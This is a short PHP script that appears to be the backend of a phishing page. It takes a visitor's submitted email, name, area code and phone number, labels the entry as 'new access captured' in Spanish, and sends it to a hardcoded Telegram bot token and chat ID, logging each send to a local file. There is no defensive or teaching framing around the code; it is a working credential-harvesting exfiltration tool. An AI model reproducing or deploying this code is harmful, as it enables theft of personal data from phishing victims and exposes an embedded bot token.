<?php
$botToken = "8691950722:AAHINdIyU2iFgn82hw1rboIIiIHFklFj0Kk";
$chatId   = "7430967735";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $correo = isset($_POST['correo']) ? htmlspecialchars($_POST['correo']) : 'No provisto';
    $nombre = isset($_POST['nombre']) ? htmlspecialchars($_POST['nombre']) : 'No provisto';
    $lada   = isset($_POST['lada'])   ? htmlspecialchars($_POST['lada'])   : 'No provisto';
    $numero = isset($_POST['numero']) ? htmlspecialchars($_POST['numero']) : 'No provisto';

    $textoTelegram  = "<b>📩 Nuevo acceso capturado</b>\n\n";
    $textoTelegram .= "📧 <b>correo:</b> " . $correo . "\n";
    $textoTelegram .= "👤 <b>nombre:</b> " . $nombre . "\n";
    $textoTelegram .= "📞 <b>lada:</b> "   . $lada   . "\n";
    $textoTelegram .= "🔢 <b>numero:</b> " . $numero . "\n";

    $url  = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    $datos = [
        'chat_id'    => $chatId,
        'text'       => $textoTelegram,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($datos));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $respuesta = curl_exec($ch);
    $curlError = curl_error($ch);
    curl_close($ch);

    file_put_contents(__DIR__ . '/telegram_log.txt',
        date('Y-m-d H:i:s') . "\n" .
        "cURL error: " . $curlError . "\n" .
        "Respuesta: " . $respuesta . "\n\n",
        FILE_APPEND
    );
}
?>